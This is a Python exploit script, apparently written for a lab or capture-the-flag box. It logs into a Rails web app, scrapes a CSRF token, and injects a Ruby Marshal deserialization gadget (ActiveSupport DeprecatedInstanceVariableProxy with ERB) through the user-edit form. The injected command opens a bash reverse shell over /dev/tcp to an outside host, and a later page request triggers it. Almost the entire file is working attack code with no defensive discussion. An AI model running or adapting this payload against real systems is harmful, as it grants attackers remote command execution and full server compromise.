import requests
from bs4 import BeautifulSoup
import urllib.parse

proxies = {
    'http': 'http://127.0.0.1:8080',
}

login_url = 'http://10.10.10.211:8080/login'

session = requests.Session()

response = session.get(login_url)
soup = BeautifulSoup(response.text, 'html.parser')

authenticity_token = soup.find('input', {'name': 'authenticity_token'})['value']

payload = {
    'session[email]': 'test@test.com',
    'session[password]': 'password123',
    'authenticity_token': authenticity_token
}

response = session.post(login_url, data=payload)

vuln_url = "http://10.10.10.211:8080/users/18/edit"

response = session.get(vuln_url)

soup = BeautifulSoup(response.text, 'html.parser')

authenticity_token = soup.find('input', {'name': 'authenticity_token'})['value']

"""
utf8=%E2%9C%93&_method=patch
&authenticity_token=aCQyGI13zsAjjJ574P0Ex4PqcWK6uRQpkw79YOw2A9AXdgTotF%2FESwjUKSiqPevJQUyvSYeYw0d%2FQ8GeK1vczA%3D%3D
&user%5Busername%5D=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%10%60/tmp/x.sh%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T&commit=Update+User
"""

cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.56/447 0>&1'"

len_cmd = chr(len(cmd) + 7)

#payload = f"""%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%{len_cmd}%09%40srcI%22%10%60{cmd}%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T"""

payload = f"""\x04\x08o\x3A\x40ActiveSupport\x3A\x3ADeprecation\x3A\x3ADeprecatedInstanceVariableProxy\x09\x3A\x0E\x40instanceo\x3A\x08ERB\x08\x3A\x09\x40srcI\x22{len_cmd}\x60{cmd}\x60\x06\x3A\x06ET\x3A\x0E\x40filenameI\x22\x061\x06\x3B\x09T\x3A\x0C\x40linenoi\x06\x3A\x0C\x40method\x3A\x0Bresult\x3A\x09\x40varI\x22\x0C\x40result\x06\x3B\x09T\x3A\x10\x40deprecatorIu\x3A\x1FActiveSupport\x3A\x3ADeprecation\x00\x06\x3B\x09T"""

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

data = {
    'utf8': "\xe2\x9c\x93",
    '_method': "patch",
    'authenticity_token': authenticity_token,
    'user[username]': payload,
    'commit': 'Update User'
}

#session.proxies = {'http': "http://127.0.0.1:8080"}

session.post("http://10.10.10.211:8080/users/18", data=data, headers=headers)

response = session.get("http://10.10.10.211:8080/articles")

print(response.text)
